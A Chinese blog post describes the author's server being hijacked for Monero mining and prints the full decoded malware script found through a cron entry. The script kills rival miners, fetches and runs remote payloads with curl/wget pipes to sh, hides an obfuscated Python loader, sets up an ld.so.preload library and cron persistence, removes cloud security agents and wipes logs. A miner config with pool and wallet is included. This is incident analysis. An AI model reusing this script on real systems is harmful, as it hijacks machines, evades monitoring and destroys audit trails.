---
date: 2018-10-15
title: "记一次被黑"
draft: false
categories:
  - Secure

thumbnailImagePosition: left
---



服务器被用来挖门罗币了。。。
 
<!--more-->

# Hacked by XMR miner 

## 起因：怪异的cron table

通过cron table 发现URL：
`https://pastebin.com/raw/1NtRkBc3`

查看其内容
```sh
curl https://pastebin.com/raw/1NtRkBc3
(curl -fsSL https://pastebin.com/raw/tRxfvbYN || wget -q -O- https://pastebin.com/raw/tRxfvbYN)|base64 -d |/bin/bash
```

## 继续

```sh
curl https://pastebin.com/raw/tRxfvbYN >> tRxfvbYN
cat tRxfvbYN | base64 --decode >> tRxfvbYN_decoded.sh
```
## 核心脚本内容

```sh
#!/bin/bash
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

function kills() {
pkill -f sourplum
pkill wnTKYg && pkill ddg* && rm -rf /tmp/ddg* && rm -rf /tmp/wnTKYg
rm -rf /tmp/qW3xT.2 /tmp/ddgs.3013 /tmp/ddgs.3012 /tmp/wnTKYg /tmp/2t3ik
rm -rf /boot/grub/deamon && rm -rf /boot/grub/disk_genius
rm -rf /tmp/*index_bak*
rm -rf /tmp/*httpd.conf*
rm -rf /tmp/*httpd.conf
rm -rf /tmp/a7b104c270
ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmrig" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmrigDaemon" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmrigMiner" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/var/tmp/java" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "/var/tmp/sustes" | awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "Xbash" | awk '{print $2}'|xargs kill -9
pkill -f biosetjenkins
pkill -f AnXqV.yam
pkill -f xmrigDaemon
pkill -f xmrigMiner
pkill -f xmrig
pkill -f Loopback
pkill -f apaceha
pkill -f cryptonight
pkill -f stratum
pkill -f mixnerdx
pkill -f performedl
pkill -f JnKihGjn
pkill -f irqba2anc1
pkill -f irqba5xnc1
pkill -f irqbnc1
pkill -f ir29xc1
pkill -f conns
pkill -f irqbalance
pkill -f crypto-pool
pkill -f minexmr
pkill -f XJnRj
pkill -f NXLAi
pkill -f BI5zj
pkill -f askdljlqw
pkill -f minerd
pkill -f minergate
pkill -f Guard.sh
pkill -f ysaydh
pkill -f bonns
pkill -f donns
pkill -f kxjd
pkill -f Duck.sh
pkill -f bonn.sh
pkill -f conn.sh
pkill -f kworker34
pkill -f kw.sh
pkill -f pro.sh
pkill -f polkitd
pkill -f acpid
pkill -f icb5o
pkill -f nopxi
pkill -f irqbalanc1
pkill -f minerd
pkill -f i586
pkill -f gddr
pkill -f mstxmr
pkill -f ddg.2011
pkill -f wnTKYg
pkill -f deamon
pkill -f disk_genius
pkill -f sourplum
pkill -f bashx
pkill -f bashg
pkill -f bashe
pkill -f bashf
pkill -f bashh
pkill -f XbashY
pkill -f libapache
pkill -f qW3xT.2
pkill -f /usr/bin/.sshd
pkill -f sustes
pkill -f Xbash
rm -rf /var/tmp/j*
rm -rf /tmp/j*
rm -rf /var/tmp/java
rm -rf /tmp/java
rm -rf /var/tmp/java2
rm -rf /tmp/java2
rm -rf /var/tmp/java*
rm -rf /tmp/java*
rm -rf /tmp/httpd.conf
rm -rf /tmp/conn
rm -rf /tmp/root.sh /tmp/pools.txt /tmp/libapache /tmp/config.json /tmp/bashf /tmp/bashg /tmp/libapache
rm -rf /tmp/conns
rm -f /tmp/irq.sh
rm -f /tmp/irqbalanc1
rm -f /tmp/irq
rm -rf /tmp/kworkerds /bin/kworkerds /bin/config.json /var/tmp/kworkerds /var/tmp/config.json /usr/local/lib/libjdk.so
rm -rf /tmp/.systemd-private-*
chattr -i /usr/lib/libiacpkmn.so.3 && rm -rf /usr/lib/libiacpkmn.so.3
chattr -i /etc/init.d/nfstruncate && rm -rf /etc/init.d/nfstruncate
netstat -anp | grep 69.28.55.86:443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
netstat -anp | grep 185.71.65.238 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
netstat -anp | grep 140.82.52.87 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
netstat -anp | grep :3333 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
netstat -anp | grep :4444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
netstat -anp | grep :5555 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
netstat -anp | grep :6666 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
netstat -anp | grep :7777 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
netstat -anp | grep :3347 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
netstat -anp | grep :14444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
netstat -anp | grep :14433 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
netstat -anp | grep :13531 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
p=$(ps auxf|grep -v grep|grep kworkerds|wc -l)
if [ ${p} -eq 0 ];then
	ps auxf|grep -v grep | awk '{if($3>=90.0) print $2}'| xargs kill -9
	netstat -anp | grep :13531 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
fi
}

function system() {
	if [ ! -f "/bin/dns" ]; then
		curl -fsSL https://pastebin.com/raw/CnPtQ2tM -o /bin/dns && chmod 755 /bin/dns
		if [ ! -f "/bin/dns" ]; then
			wget  https://pastebin.com/raw/CnPtQ2tM -O /bin/dns && chmod 755 /bin/dns
		fi
		if [ ! -f "/etc/crontab" ]; then
			echo -e "0 1 * * * root dns" >> /etc/crontab
		else
			sed -i '$d' /etc/crontab && echo -e "0 1 * * * root dns" >> /etc/crontab
		fi
	fi
}

function top() {
	mkdir -p /usr/local/lib/
	if [ ! -f "/usr/local/lib/libdns.so" ]; then
		curl -fsSL https://master.minerxmr.ru/y/1535595427x-1404817712.jpg -o /usr/local/lib/libdns.so && chmod 755 /usr/local/lib/libdns.so
		if [ ! -f "/usr/local/lib/libdns.so" ]; then
			wget https://master.minerxmr.ru/y/1535595427x-1404817712.jpg -O /usr/local/lib/libdns.so && chmod 755 /usr/local/lib/libdns.so
		fi
	fi
	if [ ! -f "/etc/ld.so.preload" ]; then
			echo /usr/local/lib/libdns.so > /etc/ld.so.preload
		else
			sed -i '$d' /etc/ld.so.preload && echo /usr/local/lib/libdns.so >> /etc/ld.so.preload
		fi
	
	touch -acmr /bin/sh /etc/ld.so.preload
	touch -acmr /bin/sh /usr/local/lib/libdns.so
}

function python() {
	nohup python -c "import base64;exec(base64.b64decode('I2NvZGluZzogdXRmLTgKaW1wb3J0IHVybGxpYgppbXBvcnQgYmFzZTY0CgpkPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1ZWdDI3TGVIJwp0cnk6CiAgICBwYWdlPWJhc2U2NC5iNjRkZWNvZGUodXJsbGliLnVybG9wZW4oZCkucmVhZCgpKQogICAgZXhlYyhwYWdlKQpleGNlcHQ6CiAgICBwYXNz'))" >/dev/null 2>&1 &
	touch /tmp/.pythong
}

function echocron() {
	echo -e "*/10 * * * * root (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh\n##" > /etc/cron.d/root
	echo -e "*/17 * * * * root (curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh\n##" > /etc/cron.d/apache
	echo -e "*/23 * * * *	(curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh\n##" > /var/spool/cron/root
	mkdir -p /var/spool/cron/crontabs
	echo -e "*/31 * * * *	(curl -fsSL https://pastebin.com/raw/1NtRkBc3||wget -q -O- https://pastebin.com/raw/1NtRkBc3)|sh\n##" > /var/spool/cron/crontabs/root
	mkdir -p /etc/cron.hourly
	curl -fsSL https://pastebin.com/raw/1NtRkBc3 -o /etc/cron.hourly/oanacroner && chmod 755 /etc/cron.hourly/oanacroner
	if [ ! -f "/etc/cron.hourly/oanacroner" ]; then
		wget https://pastebin.com/raw/1NtRkBc3 -O /etc/cron.hourly/oanacroner && chmod 755 /etc/cron.hourly/oanacroner
	fi
	mkdir -p /etc/cron.daily
	curl -fsSL https://pastebin.com/raw/1NtRkBc3 -o /etc/cron.daily/oanacroner && chmod 755 /etc/cron.daily/oanacroner
	if [ ! -f "/etc/cron.daily/oanacroner" ]; then
		wget https://pastebin.com/raw/1NtRkBc3 -O /etc/cron.daily/oanacroner && chmod 755 /etc/cron.daily/oanacroner
	fi
	mkdir -p /etc/cron.monthly
	curl -fsSL https://pastebin.com/raw/1NtRkBc3 -o /etc/cron.monthly/oanacroner && chmod 755 /etc/cron.monthly/oanacroner
	if [ ! -f "/etc/cron.monthly/oanacroner" ]; then
		wget https://pastebin.com/raw/1NtRkBc3 -O /etc/cron.monthly/oanacroner && chmod 755 /etc/cron.monthly/oanacroner
	fi
	touch -acmr /bin/sh /var/spool/cron/root
	touch -acmr /bin/sh /var/spool/cron/crontabs/root
	touch -acmr /bin/sh /etc/cron.d/apache
	touch -acmr /bin/sh /etc/cron.d/root
	touch -acmr /bin/sh /etc/cron.hourly/oanacroner
	touch -acmr /bin/sh /etc/cron.daily/oanacroner
	touch -acmr /bin/sh /etc/cron.monthly/oanacroner
}

function tables() {
	iptables -I INPUT -p TCP --dport 6379 -j REJECT
	iptables -I INPUT -s 127.0.0.1 -p tcp --dport 6379 -j ACCEPT
	iptables-save
	touch /tmp/.tables
}

function uninstall() {
	if ps aux | grep -i '[a]liyun'; then
		wget http://update.aegis.aliyun.com/download/uninstall.sh
		chmod +x uninstall.sh
		./uninstall.sh
		wget http://update.aegis.aliyun.com/download/quartz_uninstall.sh
		chmod +x quartz_uninstall.sh
		./quartz_uninstall.sh
		rm -f uninstall.sh 	quartz_uninstall.sh
		pkill aliyun-service
		rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
		rm -rf /usr/local/aegis*;
	elif ps aux | grep -i '[y]unjing'; then
		/usr/local/qcloud/stargate/admin/uninstall.sh
		/usr/local/qcloud/YunJing/uninst.sh
		/usr/local/qcloud/monitor/barad/admin/uninstall.sh
	fi
	touch /tmp/.uninstall
}

function downloadrun() {
	ps=$(netstat -an | grep :56415 | wc -l)
	if [ ${ps} -eq 0 ];then
		if [ ! -f "/tmp/kworkerds" ]; then
			curl -fsSL --connect-timeout 120 https://master.minerxmr.ru/y/1538099276x-1404792622.jpg -o /tmp/kworkerds && chmod +x /tmp/kworkerds
			if [ ! -f "/tmp/kworkerds" ]; then
				wget https://master.minerxmr.ru/y/1538099276x-1404792622.jpg -O /tmp/kworkerds && chmod +x /tmp/kworkerds
			fi
				nohup /tmp/kworkerds >/dev/null 2>&1 &
		else
			nohup /tmp/kworkerds >/dev/null 2>&1 &
		fi
	fi
}

function downloadrunxm() {
	mkdir -p /var/tmp
	chmod 1777 /var/tmp
	pm=$(netstat -an | grep :56415 | wc -l)
	if [ ${pm} -eq 0 ];then
		rm -rf /var/tmp/config.json*
		curl -fsSL --connect-timeout 120 https://master.minerxmr.ru/y/1534496022x-1404764583.jpg -o /var/tmp/config.json && chmod +x /var/tmp/config.json
		if [ ! -f "/var/tmp/config.json" ]; then
			wget https://master.minerxmr.ru/y/1534496022x-1404764583.jpg -O /var/tmp/config.json && chmod +x /var/tmp/config.json
		fi
		ARCH=$(uname -i)
		if [ "$ARCH" == "x86_64" ]; then
			rm -rf /var/tmp/kworkerds*
			curl -fsSL --connect-timeout 120 https://master.minerxmr.ru/y/1537410304x-1404764882.jpg -o /var/tmp/kworkerds && chmod +x /var/tmp/kworkerds
			if [ ! -f "/var/tmp/kworkerds" ]; then
				wget https://master.minerxmr.ru/y/1537410304x-1404764882.jpg -O /bin/kworkerds && chmod +x /var/tmp/kworkerds
			fi
			nohup /var/tmp/kworkerds >/dev/null 2>&1 &
		elif [ "$ARCH" == "i386" ]; then
			rm -rf /var/tmp/kworkerds*
			curl -fsSL --connect-timeout 120 https://master.minerxmr.ru/y/1537410750x-1566657908.jpg -o /var/tmp/kworkerds && chmod +x /var/tmp/kworkerds
			if [ ! -f "/var/tmp/kworkerds" ]; then
				wget https://master.minerxmr.ru/y/1537410750x-1566657908.jpg -O /bin/kworkerds && chmod +x /var/tmp/kworkerds
			fi
			nohup /var/tmp/kworkerds >/dev/null 2>&1 &
		else
			rm -rf /var/tmp/kworkerds*
			curl -fsSL --connect-timeout 120 https://master.minerxmr.ru/y/1537410304x-1404764882.jpg -o /var/tmp/kworkerds && chmod +x /var/tmp/kworkerds
			if [ ! -f "/var/tmp/kworkerds" ]; then
				wget https://master.minerxmr.ru/y/1537410304x-1404764882.jpg -O /bin/kworkerds && chmod +x /var/tmp/kworkerds
			fi
			nohup /var/tmp/kworkerds >/dev/null 2>&1 &
		fi
	fi
}

mkdir -p /tmp
chmod 1777 /tmp
update=$( curl -fsSL --connect-timeout 120 https://pastebin.com/raw/SSCy7mY7 )
if [ ${update}x = "update"x ];then
	echocron
else
	if [ ! -f "/tmp/.uninstall" ]; then
		uninstall
	fi
	if [ ! -f "/tmp/.tables" ]; then
		tables
	fi
	if [ ! -f "/tmp/.pythong" ]; then
		rm -rf /tmp/.pythonf
		python
	fi
	kills
	downloadrun
	echocron
	system
	top
	sleep 10
	port=$(netstat -an | grep :56415 | wc -l)
	if [ ${port} -eq 0 ];then
		downloadrunxm
	fi
	echo 0>/var/spool/mail/root
	echo 0>/var/log/wtmp
	echo 0>/var/log/secure
	echo 0>/var/log/cron
fi
#
```

脚本中出现的挖矿程序的配置：
```sh
if [ ! -f "/var/tmp/config.json" ]; then
        wget https://master.minerxmr.ru/y/1534496022x-1404764583.jpg -O /var/tmp/config.json && chmod +x /var/tmp/config.json
fi
```
内容为：
```sh
curl https://master.minerxmr.ru/y/1534496022x-1404764583.jpg
```

```json
{
    "algo": "cryptonight",
    "api": {
        "port": 0,
        "access-token": null,
        "worker-id": null,
        "ipv6": false,
        "restricted": true
    },
    "av": 0,
    "background": false,
    "colors": true, 
    "cpu-affinity": null,
    "cpu-priority": null,
    "donate-level": 0,
    "huge-pages": true,
    "hw-aes": null,
    "log-file": null,
    "max-cpu-usage": 100,
    "pools": [
        {
            "url": "stratum+tcp://x1.minerxmr.ru:56415",
            "user": "47eCpELDZBiVoxDT1tBxCX7fFU4kcSTDLTW2FzYTuB1H3yzrKTtXLAVRsBWcsYpfQzfHjHKtQAJshNyTU88LwNY4Q3rHFYA.xmrig",
            "pass": "pro2",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "variant": 1
        }
    ],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "safe": false,
    "threads": null,
    "user-agent": null,
    "watch": false
}
```
